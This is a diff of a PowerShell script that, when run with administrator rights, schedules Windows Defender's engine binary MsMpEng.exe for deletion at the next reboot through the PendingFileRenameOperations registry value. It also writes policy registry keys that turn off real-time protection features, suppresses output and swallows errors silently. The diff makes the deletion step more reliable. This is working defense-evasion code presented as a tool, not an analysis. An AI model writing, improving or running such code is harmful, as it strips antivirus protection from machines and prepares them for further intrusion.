@@ -11,15 +11,22 @@ if (IsAdmin) {
     # PendingFileRenameOperations technique
     try {
         $DefenderBinaryPath = "C:\Program Files\Windows Defender\MsMpEng.exe"
-        $currentOperations = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" `
-        -Name "PendingFileRenameOperations" -ErrorAction SilentlyContinue).PendingFileRenameOperations
-        $newOperation = "\??\$DefenderBinaryPath`0`0"
-        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" `
-        -Name "PendingFileRenameOperations" -Value @($currentOperations + $newOperation) -Force
+        $keyPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
+        $newOperation = "\??\$DefenderBinaryPath"
+
+        # Ensure the key exists
+        if (-not (Get-ItemProperty -Path $keyPath -Name "PendingFileRenameOperations" -ErrorAction SilentlyContinue)) {
+            New-ItemProperty -Path $keyPath -Name "PendingFileRenameOperations" -PropertyType MultiString -Value @() -Force
+        }
+
+        # Add the new operation
+        $currentOperations = (Get-ItemProperty -Path $keyPath -Name "PendingFileRenameOperations" -ErrorAction SilentlyContinue).PendingFileRenameOperations
+        Set-ItemProperty -Path $keyPath -Name "PendingFileRenameOperations" -Value ($currentOperations + $newOperation | Where-Object { $_ -ne "" }) -Force
+
         # Verify the change
-        $pendingFileRenameSuccess = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" `
-        -Name "PendingFileRenameOperations" -ErrorAction SilentlyContinue).PendingFileRenameOperations -like "*MsMpEng.exe*"
+        $pendingFileRenameSuccess = (Get-ItemProperty -Path $keyPath -Name "PendingFileRenameOperations" -ErrorAction SilentlyContinue).PendingFileRenameOperations -like "*MsMpEng.exe*"
     } catch {
+        # Silent failure
     }
 
     # Registry modification technique
@@ -35,7 +42,6 @@ if (IsAdmin) {
     try { cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIntrusionPreventionSystem" /t REG_DWORD /d "1" /f >$null 2>&1 } catch {}
     try { cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f >$null 2>&1 } catch {}
     try { cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d "0" /f >$null 2>&1 } catch {}
-
 
     # Final output based on results
     if ($pendingFileRenameSuccess -or ((Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -ErrorAction SilentlyContinue).DisableRealtimeMonitoring -eq 1)) {
